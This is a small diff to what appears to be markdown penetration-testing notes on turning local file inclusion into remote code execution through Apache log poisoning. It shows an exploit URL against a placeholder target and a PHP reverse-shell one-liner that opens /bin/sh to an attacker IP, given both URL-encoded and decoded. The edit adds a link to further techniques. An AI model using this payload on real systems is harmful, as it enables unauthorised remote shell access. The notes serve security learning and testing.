@@ -216,9 +216,9 @@ This means getting command execution on target exploiting LFI.
       
       http://targetsite.com/get.php?file=../../../../var/log/apache2/access.log&cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.8.32.131%22%2C5000)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
 
-Where we URL encoded `php -r '$sock=fsockopen("10.8.32.131",5000);exec("/bin/sh -i <&3 >&3 2>&3");'`
-      
-This is also known as **Log poisoning**
+Where we URL encoded `php -r '$sock=fsockopen("10.8.32.131",5000);exec("/bin/sh -i <&3 >&3 2>&3");'`. This is also known as **Log poisoning**.
+For all other LFI-2-RCE (via /proc/self/environ, via upload, via PHPSESSID, via vsftpd logs ecc.) have a look on [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion).
+
 
 ### SSRF
 
